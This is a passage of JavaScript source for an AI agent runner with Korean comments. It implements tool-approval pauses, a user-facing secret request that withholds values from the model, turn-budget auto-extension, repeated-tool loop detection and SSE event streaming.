        return { behavior: 'deny', message: `Tool '${toolName}' blocked by policy: ${decision.reason}` }
      }

      // plan_request — in-flight pause
      const record = approvalManager.create(
        {
          toolName,
          commandSummary: summary,
          reason: decision.reason,
          sessionId,
        },
        approvalTimeoutMs,
      )
      approvalRouting.set(record.id, sessionId)

      emitSseEvent(sessionId, 'plan_request', {
        plan: buildPlanContent({ toolName, commandSummary: summary, reason: decision.reason }),
        operations: [`${toolName}: ${summary}`],
        session_id: sessionId,
        approval_id: record.id,
        tool_name: toolName,
        command_summary: summary,
        reason: decision.reason,
      })

      const result = await approvalManager.waitForDecision(record, approvalTimeoutMs)
      approvalRouting.delete(record.id)

      if (!result || result.kind === 'deny') {
        const blockedReason = result ? 'user-denied' : 'timeout'
        emitSseEvent(sessionId, 'tool_use', {
          name: toolName,
          input,
          input_summary: `[${result ? '거부됨' : '시간 초과'}] ${summary}`,
          tool_index: toolIndex++,
          blocked_by_policy: blockedReason,
        })
        return { behavior: 'deny', message: result?.feedback || 'Approval denied or timed out' }
      }

      // allow_once / allow_always — proceed.
      // allowlist 누적은 cloud 측에서 workspace.policy.allowlist에 기록(T10).
      return { behavior: 'allow', updatedInput: applyCacheRedirectCorrection(toolName, input) }
    }

    /**
     * request_secret 도구 실행 (Phase B) — llm-wrapper runTool이 ctx.onRequestSecret으로 위임.
     * env에 이미 있으면 즉시 "사용 가능", 없으면 secret_request로 사용자에게 요청(in-flight pause).
     * 사용자가 값을 제공하면 process.env[KEY]에 주입 → 후속 Bash 등의 buildToolEnv가 즉시 픽업.
     * 값(평문)은 LLM에 절대 반환하지 않는다 — 결과는 핸들 텍스트만. SSE에도 평문 미포함.
     */
    const onRequestSecret = async (input) => {
      const keyName = typeof input?.key_name === 'string' ? input.key_name.trim() : ''
      const reason = typeof input?.reason === 'string' ? input.reason.trim() : ''
      if (!isValidSecretKey(keyName)) {
        return {
          content: `request_secret: key_name '${keyName}'이(가) 유효하지 않아요. 대문자로 시작하는 영대문자/숫자/밑줄만 허용해요 (예: STRIPE_API_KEY).`,
          is_error: true,
        }
      }
      // 예약어(시스템 실행흐름·내부 인프라 시크릿)는 거부 — 격리의 2차 가드(자식 Bash 무결성·토큰 노출 방지).
      if (isReservedKey(keyName)) {
        return {
          content: `'${keyName}'은(는) 시스템 예약 환경변수라 등록할 수 없어요. 다른 이름을 쓰거나, 정말 필요하면 관리자에게 직접 설정을 요청하세요.`,
          is_error: true,
        }
      }

      // 이미 사용 가능하면 즉시 반환(턴 넘어 재요청 방지): (a) 이 프로세스에서 받은 적 있거나(workspaceSecrets),
      // (b) 재시작 시 vault→.integrations.env로 주입돼 Bash가 BASH_ENV로 이미 보유 중이거나. 값은 노출하지 않음.
      if (workspaceSecrets.has(keyName) || (await isKeyInIntegrationsEnv(keyName))) {
        emitSseEvent(sessionId, 'secret_used', { key_name: keyName })
        return { content: `'${keyName}'은(는) 이미 사용 가능해요. Bash 등에서 $${keyName}로 참조하세요. (값은 보안상 비공개)` }
      }

      // 없으면 사용자에게 요청 — in-flight pause. SSE secret_request에는 평문이 포함되지 않는다.
      const record = approvalManager.create(
        { toolName: 'request_secret', commandSummary: keyName, reason: reason || `'${keyName}' 환경변수가 필요해요`, sessionId },
        approvalTimeoutMs,
      )
      approvalRouting.set(record.id, sessionId)

      emitSseEvent(sessionId, 'secret_request', {
        key_name: keyName,
        reason: reason || `'${keyName}' 환경변수가 필요해요`,
        session_id: sessionId,
        approval_id: record.id,
      })

      const result = await approvalManager.waitForDecision(record, approvalTimeoutMs)
      approvalRouting.delete(record.id)

      if (!result) {
        return {
          content: `'${keyName}' 입력 대기 시간이 초과됐어요. 사용자에게 다시 요청하거나, 설정의 환경변수 메뉴에서 직접 등록하도록 안내하세요.`,
          is_error: true,
        }
      }
      if (result.secretAction === 'skip' || result.kind === 'deny') {
        return {
          content: `사용자가 '${keyName}' 입력을 건너뛰었어요. 이 키 없이 가능한 다른 방법을 시도하거나, 대안을 사용자에게 물어보세요.`,
        }
      }
      const value = typeof result.value === 'string' ? result.value : ''
      if (!value) {
        return { content: `'${keyName}' 값이 비어 있어 등록하지 못했어요.`, is_error: true }
      }
      // 세션 store에 주입 → getToolEnv를 통해 도구 자식 프로세스 env로만 흐른다(본체 process.env 불변).
      // cloud는 별도로 vault(AES-256-GCM) + .integrations.env에 영속화(다음 sandbox 재시작 시 BASH_ENV로 자식 주입).
      workspaceSecrets.set(keyName, value)
      emitSseEvent(sessionId, 'secret_resolved', { key_name: keyName })
      return {
        content: `'${keyName}'이(가) 등록돼서 이제 사용 가능해요. Bash 등에서 $${keyName}로 참조하세요. (값은 보안상 비공개라 다시 표시되지 않아요)`,
      }
    }

    // SDK maxTurns는 절대 상한(brake)만 담당. 실제 통제는 자체 turnCount + plan_request 결재.
    // 결재 거부 시 abortController.abort()로 중단. SDK가 먼저 끝나면 자체 카운터의
    // 결재 기회를 잃으므로 충분히 크게.
    // Claude Agent SDK가 cache_control 마커를 노출하지 않으므로, 호출자(cloud)가 보낸 system_prompt
    // 기반 최종 string의 sha256 prefix를 로깅. 호출자 로그와 같은 hash면 SDK가 보는 prefix가
    // 안정적이라는 사후 증거 (캐시 hit 추적). 워크스페이스 규약(세션 프로토콜 등)은 호출자가 소유 —
    // runner는 받은 system_prompt를 그대로 사용한다.
    const baseSystemPrompt = params.system_prompt ?? ''
    // 후속 턴(history 비어있지 않음)에만 연속-턴 안내를 덧붙여 "Session Start" 재인사 회귀를 막는다.
    const isContinuationTurn = Array.isArray(params.history) && params.history.length > 0
    const effectiveSystemPrompt = isContinuationTurn
      ? `${baseSystemPrompt}\n\n${CONTINUATION_NOTICE}`
      : baseSystemPrompt
    const systemHash = createHash('sha256').update(effectiveSystemPrompt).digest('hex').slice(0, 8)
    console.log('[agent-runner] systemPrompt 합성', JSON.stringify({
      systemHash,
      systemLength: effectiveSystemPrompt.length,
      hasUpstreamSystem: !!params.system_prompt,
      isContinuationTurn,
      sdkSessionId: params.session_id ?? null,
    }))

    // SDK maxTurns는 절대 상한(brake)만 담당. 실제 통제는 자체 turnCount + plan_request 결재.
    // 결재 거부 시 abortController.abort()로 중단. SDK가 먼저 끝나면 자체 카운터의
    // 결재 기회를 잃으므로 충분히 크게.
    const queryOptions = {
      model: params.model ?? DEFAULT_FALLBACK_MODEL,
      systemPrompt: effectiveSystemPrompt,
      cwd: params.context_dir ?? DEFAULT_CWD,
      allowedTools,
      permissionMode: 'acceptEdits',
      maxTurns: SDK_HARD_MAX_TURNS,
      abortController,
      canUseTool,
      // request_secret(Phase B) 도구 노출 — LLM이 필요한 환경변수를 사용자에게 요청할 수 있게.
      // llm-wrapper가 options.tools를 LLM 요청 tools[]에 머지하고, runTool은 onRequestSecret으로 라우팅.
      tools: [REQUEST_SECRET_TOOL],
    }

    // 자체 turn 카운터: assistant 메시지 수신마다 +1. budget 도달 시 silent 자동 연장
    // (MAX_AUTO_EXTENSIONS까지), 초과 시 자연 종료. 사용자 결재(plan_request) 발신 X.
    let turnCount = 0
    let turnBudget = params.max_turns
    let extensionsUsed = 0

    // 같은 도구 + 같은 입력 연속 호출 감지 — 루프 의심 자동 종료 신호.
    // toolName만 비교하면 한글 파일 분석 등 정상 워크플로우(서로 다른 Bash 명령 N회)도 false
    // positive로 잡히므로 toolKey = name + 입력 fingerprint로 식별. 입력이 바뀌면 진행 신호로
    // 간주해 카운터 리셋.
    let lastToolKey = ''
    let repeatedToolCount = 0
    /** 도구 루프/턴 한도로 자연 종료 결정 시 outer for-await을 break하기 위한 플래그. */
    let forceTerminate = false

    // MCP 서버가 있으면 SDK에 전달 (네이티브 HTTP transport)
    if (mcpServers.length > 0) {
      queryOptions.mcpServers = mcpServers
    }

    // 하이브리드 구조: SDK 호출은 llm-wrapper로 격리. 마이그레이션 트리거 시 wrapper만 교체.
    // emitLLMEvent는 호환 layer — 현재는 noop, 마이그레이션 시점에 LLMEvent 처리 활성화.
    const sdkPrompt = buildPromptWithHistory(params.history, params.message)

    // turn-manager 가 text 블록의 text_delta 도착 시점마다 호출. 토큰 단위 라이브 표시용.
    // partial 이 한 번이라도 흐른 turn 은 block 단위 'text' emit 을 skip(중복 방지).
    let partialEmittedThisTurn = false

    // P1-A: rate_limit/overloaded/5xx/timeout 일시 실패는 jittered backoff로 재시도.
    // 단, retry 영역은 *첫 message yield 전*에만 — 한 번이라도 emit한 뒤 throw하면
    // SSE seq 정합 오염 위험이 있으므로 raw surface (retry-utils.asyncIteratorWithFirstYieldRetry).
    const retryingSdkStream = asyncIteratorWithFirstYieldRetry(
      () => runAnthropicSdkStream(
        { prompt: sdkPrompt, options: queryOptions },
        {
          signal: abortController.signal,
          onPartialText: (delta) => {
            partialEmittedThisTurn = true
            emitSseEvent(sessionId, 'text_delta', { delta })
          },
          onRequestSecret,
          // Phase B 격리 — 세션 secret을 도구 자식 프로세스 env로만 전달(본체 process.env 미오염).
          getToolEnv: () => Object.fromEntries(workspaceSecrets),
        },
      ),
      {
        signal: abortController.signal,
        onRetry: ({ attempt, delayMs, reason, status }) => {
          // cloud UI/로그에 가시화 — 활성 res가 있으면 SSE로, 없어도 buffer에는 누적.
          emitSseEvent(sessionId, 'retry', {
            attempt,
            delay_ms: delayMs,
            reason,
            ...(typeof status === 'number' ? { status } : {}),
          })
        },
      },
    )

    for await (const message of retryingSdkStream) {
      if (abortController.signal.aborted) break

      // 자체 turn 카운터: assistant 메시지 1건 = 1 turn. budget 도달 시 silent 자동 연장,
      // MAX_AUTO_EXTENSIONS 초과 시 자연 종료 (error_max_turns 경로와 동일 UX). 사용자 결재 없음.
      if (message.type === 'assistant') {
        turnCount++
        if (turnCount >= turnBudget) {
          if (extensionsUsed < MAX_AUTO_EXTENSIONS) {
            extensionsUsed++
            turnBudget += AUTO_EXTEND_INCREMENT
            // 관찰성용 이벤트 — cloud-side 핸들러 없어도 무해(EventBuffer에만 누적).
            emitSseEvent(sessionId, 'auto_extended', {
              turn_count: turnCount,
              new_budget: turnBudget,
              extensions_used: extensionsUsed,
              max_extensions: MAX_AUTO_EXTENSIONS,
            })
          } else {
            emitSseEvent(sessionId, 'error', {
              code: 'turn_budget_exhausted',
              message: '작업이 예상보다 길어져 여기서 일단 멈췄어요. 더 작은 단위로 나눠 다시 요청해주세요',
              recoverable: false,
            })
            abortController.abort()
            forceTerminate = true
            break
          }
        }
      }

      // assistant 메시지: 텍스트와 도구 사용
      // 정책 평가는 canUseTool(T1)에서 사전 처리됨 — 여기까지 도달한 도구는 모두 allow된 것.
      if (message.type === 'assistant' && message.message?.content) {
        // partial 이 흘렀으면 cumulative 'text' 는 중복이므로 skip. snapshot 으로 찍어
        // 같은 turn 의 모든 text 블록을 일관되게 처리한 뒤, 다음 turn 을 위해 flag 를 reset.
        const skipBlockTextEmit = partialEmittedThisTurn
        for (const block of message.message.content) {
          if ('text' in block && block.text) {
            finalContent += block.text
            if (!skipBlockTextEmit) {
              // partial 미수신 케이스(예: 비 streaming 경로)의 fallback.
              emitSseEvent(sessionId, 'text', { content: block.text })
            }
          } else if ('name' in block) {
            const toolName = String(block.name ?? '')
            const toolInput = block.input ?? {}

            // 같은 도구 + 같은 입력 연속 호출만 루프로 판단. 입력이 달라지면 진행 신호로 보고
            // 카운터 리셋(예: Bash로 서로 다른 명령 N회, Read로 다른 파일 N회는 정상).
            // 진짜 stuck 패턴은 동일 input을 반복하는 상태(예: 같은 명령·같은 파일 N회).
            let inputFingerprint = ''
            try {
              inputFingerprint = JSON.stringify(toolInput) ?? ''
            } catch {
              /* 순환 참조 등 — 빈 문자열로 안전 처리 */
            }
            const toolKey = `${toolName}:${inputFingerprint}`
            if (toolKey === lastToolKey) {
              repeatedToolCount++
            } else {
              lastToolKey = toolKey
              repeatedToolCount = 1
            }
            if (repeatedToolCount >= REPEATED_TOOL_THRESHOLD) {
              emitSseEvent(sessionId, 'error', {
                code: 'repeated_tool_loop',
                message: `같은 도구(${toolName})를 같은 입력으로 ${repeatedToolCount}번 반복해 루프로 판단해 멈췄어요. 다른 방식으로 접근이 필요해요`,
                recoverable: false,
              })
              abortController.abort()
              forceTerminate = true
              break
            }

            // 지식 경로 접근 감지 — /workspace/knowledge/ 하위를 읽는 도구면 플래그.
            // 클라우드 측 stream-handler가 이 플래그를 보고 recordDocumentAccess로 기록.
            const knowledgeAccess = detectKnowledgeAccess(toolName, toolInput)

            const myToolIndex = toolIndex++
            const toolUseId = typeof block.id === 'string' ? block.id : ''
            if (toolUseId) toolIndexById.set(toolUseId, myToolIndex)

            emitSseEvent(sessionId, 'tool_use', {
              name: toolName,
              input: toolInput,
              input_summary: '',
              tool_index: myToolIndex,
              ...(knowledgeAccess ? { knowledge_access: knowledgeAccess } : {}),
            })
            startToolProgress(myToolIndex)
          }
        }
        if (forceTerminate) break
        // 다음 turn 의 partial 추적을 위해 reset. (text_delta 가 또 흐르면 다시 true.)
        partialEmittedThisTurn = false
      }

      // user 메시지(다음 turn 입력)에는 SDK가 합성한 tool_result 블록이 들어 있음.
      // cloud onToolResult를 호출해 entry.duration_ms를 채울 수 있도록 SSE로 발행.
      // 매칭은 tool_use_id → toolIndex 맵을 통해 정확히 복원.
      if (message.type === 'user' && message.message?.content) {
        const blocks = Array.isArray(message.message.content) ? message.message.content : []
        for (const block of blocks) {
          if (!block || block.type !== 'tool_result') continue
          const tuid = typeof block.tool_use_id === 'string' ? block.tool_use_id : ''
          const matchedIndex = tuid ? toolIndexById.get(tuid) : undefined
          if (typeof matchedIndex !== 'number') continue
          // SDK는 content를 string 또는 [{type:'text', text}, ...] 형태로 줌. 텍스트만 추출.
          let output = ''
          if (typeof block.content === 'string') {
            output = block.content
          } else if (Array.isArray(block.content)) {
            output = block.content
              .map((c) => (c && typeof c.text === 'string' ? c.text : ''))
              .filter(Boolean)
              .join('\n')
          }
          emitSseEvent(sessionId, 'tool_result', {
            output,
            is_error: block.is_error === true,
            tool_index: matchedIndex,
          })
          stopToolProgress(matchedIndex)
        }
      }

      // assistant/result 메시지의 usage 필드에서 토큰 누적 + SSE 발행
      // SDK는 prompt caching을 자동 적용 (1h ttl 기본). cache_* 필드를 끝까지 전파해
      // 클라우드 측에서 hit ratio 측정 가능하게 한다.
      const usage = message.message?.usage
      if (usage) {
        const inputTokens = usage.input_tokens ?? 0
        const outputTokens = usage.output_tokens ?? 0
        const cacheReadTokens = usage.cache_read_input_tokens ?? 0
        const cacheCreationTokens = usage.cache_creation_input_tokens ?? 0
        if (inputTokens > 0 || outputTokens > 0 || cacheReadTokens > 0 || cacheCreationTokens > 0) {
          totalInputTokens += inputTokens
          totalOutputTokens += outputTokens
          emitSseEvent(sessionId, 'usage', {
            input_tokens: inputTokens,
            output_tokens: outputTokens,
            cache_read_input_tokens: cacheReadTokens,
            cache_creation_input_tokens: cacheCreationTokens,
          })
        }
      }

      // result 메시지: 완료
      if (message.type === 'result') {
        if (message.subtype === 'error_max_turns') {
          emitSseEvent(sessionId, 'error', {
            code: 'max_turns',
            message: `도구 루프가 ${params.max_turns}턴 상한에 도달해 종료했어요. 더 작은 단위로 나눠 다시 요청해주세요`,
            recoverable: false,
          })
        }
      }
    }

    // 완료 이벤트 (토큰 폴백 포함)
    emitSseEvent(sessionId, 'done', {
      content: finalContent,
      session_id: sessionId,
      total_input_tokens: totalInputTokens,
      total_output_tokens: totalOutputTokens,
    })
  } catch (err) {
    // T1: 원문 스택·body는 errors.log(영속)에만. cloud로는 "분류 코드 + 시크릿 마스킹한 한 줄 요약"만 보낸다.
    // (레퍼런스 3사 공통 원칙: 원문 금지, 분류 코드는 필수.) message는 기존 호환을 위해 고정 유지.
    const cls = classifyLlmError(err)
    const detail = sanitizeErrorDetail(err)
    logError('[agent-runner] SDK execution error', `category=${cls.reason}`, err instanceof Error ? err.stack || err.message : err)
    emitSseEvent(sessionId, 'error', {
      code: 'sdk_error',
      category: cls.reason,
      status: cls.status,
      message: 'Agent execution failed.',
      detail,
      recoverable: false,
    })
    emitSseEvent(sessionId, 'done', { content: '', session_id: sessionId })
  } finally {
    // 진행 중이던 도구 timer 모두 정리 (정상 종료/abort 무관).
    stopAllToolProgress()
    // 현재 res가 활성 세션에 등록된 것과 일치하면 정리.
    // T5 resume이 res를 swap했을 수 있으므로 swap된 res는 resume 핸들러가 직접 닫는다.
    const session = activeSessions.get(sessionId)
    // heartbeat은 SDK 종료와 동시에 멈춤 — 모든 분기 공통.
    session?.heartbeatStop?.()
    if (session?.res === res) {
      activeSessions.delete(sessionId)
      if (!res.writableEnded) res.end()
    } else if (session) {
      // resume이 res를 가져갔음 — SDK 종료만 등록.
      // resume 핸들러의 polling 루프가 buffer.done을 감지하고 res.end()를 처리.
      activeSessions.delete(sessionId)
    } else {
      // 누군가 이미 정리. res 닫기만.
      if (!res.writableEnded) res.end()
    }
  }
}
